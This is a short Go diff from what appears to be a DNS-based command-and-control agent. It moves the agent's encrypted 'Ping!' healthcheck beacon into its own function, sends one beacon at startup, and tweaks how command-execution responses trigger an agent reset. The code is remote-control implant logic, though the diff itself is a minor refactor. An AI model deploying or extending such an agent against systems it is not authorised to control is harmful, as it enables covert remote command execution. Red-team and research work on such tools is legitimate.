@@ -129,7 +129,7 @@ func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 		return nil // todo
 
 	case c2.MessageExecuteCommandRes:
-		if command.Msg.IsLastPart {
+		if command.Msg.IsLastPart || command.Msg.ParentPartID == 0 {
 			log.Infof("got last part of command response") //todo: remove
 			ResetAgent()
 		}
@@ -178,6 +178,26 @@ func SendQuestionToServer(Q string) error {
 	return nil
 }
 
+func sendHealthCheck() error {
+	msg := c2.MessagePacket{
+		TimeStamp:   uint32(time.Now().Unix()),
+		MessageType: AgentStatus.NextMessageType,
+	}
+	// set payload based on next message type?
+	payload := []byte("Ping!")
+	Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
+	if err != nil {
+		log.Warnf("Error sending Message to Server")
+	}
+	for _, Q := range Questions {
+		err = SendQuestionToServer(Q)
+		if err != nil {
+			log.Warnf("Error sending Message to Server: %s", err)
+		}
+	}
+	return nil
+}
+
 func RunAgent(cmd *cobra.Command, args []string) error {
 	log.Infof("Starting agent...")
 	// set global flag that we're running as server
@@ -200,7 +220,7 @@ func RunAgent(cmd *cobra.Command, args []string) error {
 	errorHandler(err)
 	conf.GlobalAgentConfig.ServerPublicKey, err = cryptography.PublicKeyFromString(conf.GlobalAgentConfig.ServerPublicKeyB32)
 	errorHandler(err)
-
+	sendHealthCheck()
 	for {
 		select {
 		case <-exiting:
@@ -208,23 +228,7 @@ func RunAgent(cmd *cobra.Command, args []string) error {
 			return nil
 		case <-AgentStatus.MessageTicker.C:
 			if AgentStatus.NextMessageType == c2.MessageHealthcheck {
-				msg := c2.MessagePacket{
-					TimeStamp:   uint32(time.Now().Unix()),
-					MessageType: AgentStatus.NextMessageType,
-				}
-				// set payload based on next message type?
-				payload := []byte("Ping!")
-				Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
-				if err != nil {
-					log.Warnf("Error sending Message to Server")
-				}
-				for _, Q := range Questions {
-					err = SendQuestionToServer(Q)
-					if err != nil {
-						log.Warnf("Error sending Message to Server: %s", err)
-					}
-				}
-
+				sendHealthCheck()
 			}
 			if AgentStatus.NextMessageType == c2.MessageExecuteCommandRes {
 				msg := c2.MessagePacket{
